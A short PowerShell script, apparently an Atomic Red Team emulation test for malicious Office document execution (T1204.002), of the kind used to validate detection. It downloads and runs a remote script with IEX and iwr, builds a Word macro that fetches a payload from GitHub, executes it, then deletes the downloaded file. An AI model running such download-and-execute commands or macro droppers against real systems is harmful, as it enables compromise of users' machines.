[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macroCode = Get-Content "C:/AtomicRedTeam/atomics/T1204.002/src/test9-GenericPayloadDownload.txt" -Raw
$URL = "https://raw.githubusercontent.com" + "/" + "redcanaryco/atomic-red-team/master/atomics/T1204.002/src"
$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "test9-example-payload.txt"
Write-Host $macroCode
Invoke-MalDoc -macroCode $macroCode -officeProduct "Word"

# 删除文件下载到桌面的文件
Remove-Item -Path "C:\Users\$env:username\Desktop\test9-example-payload.txt"